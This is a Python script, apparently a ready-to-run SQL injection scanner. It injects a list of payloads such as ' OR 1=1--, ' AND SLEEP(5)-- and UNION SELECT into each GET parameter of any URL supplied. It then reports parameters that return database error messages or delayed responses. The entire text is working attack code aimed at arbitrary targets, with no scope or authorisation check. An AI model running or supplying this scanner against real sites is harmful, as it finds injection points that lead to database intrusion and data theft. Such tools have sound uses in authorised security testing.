import requests
import sys
import urllib.parse

# Simple payloads for testing different types of SQL injection
SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "';--",
    "\";--",
    "' OR 1=1--",
    "' AND SLEEP(5)--",   # Time-based
    "' UNION SELECT NULL--",
]

ERROR_KEYWORDS = [
    "sql syntax",
    "mysql_fetch",
    "ORA-01756",
    "unterminated",
    "Query failed",
    "You have an error in your SQL syntax",
    "Warning: sqlite_",
    "PG::SyntaxError",
]

def is_vulnerable(response_text: str, response_time: float, payload: str) -> bool:
    # Check for common SQL error messages
    if any(err.lower() in response_text.lower() for err in ERROR_KEYWORDS):
        return True
    # Simple time-based SQLi detection (for payloads like SLEEP())
    if "sleep" in payload.lower() and response_time > 4:
        return True
    return False

def scan_url(target_url: str):
    print(f"[+] Starting SQLi scan on: {target_url}\n")
    parsed_url = urllib.parse.urlparse(target_url)
    query = urllib.parse.parse_qs(parsed_url.query)

    if not query:
        print("[-] No query parameters found in URL. Try a dynamic endpoint with GET parameters.")
        return

    for param in query:
        for payload in SQLI_PAYLOADS:
            modified_query = query.copy()
            modified_query[param] = payload
            encoded_query = urllib.parse.urlencode(modified_query, doseq=True)
            test_url = urllib.parse.urlunparse(
                parsed_url._replace(query=encoded_query)
            )

            try:
                response = requests.get(test_url, timeout=8)
                vulnerable = is_vulnerable(response.text, response.elapsed.total_seconds(), payload)

                if vulnerable:
                    print(f"[!] Potential SQLi detected with payload: {payload}")
                    print(f"    -> {test_url}")
            except requests.RequestException as e:
                print(f"[!] Request failed for payload {payload}: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <URL_with_params>")
        print(f"Example: python3 {sys.argv[0]} 'http://example.com/page.php?id=1'")
        sys.exit(1)

    scan_url(sys.argv[1])
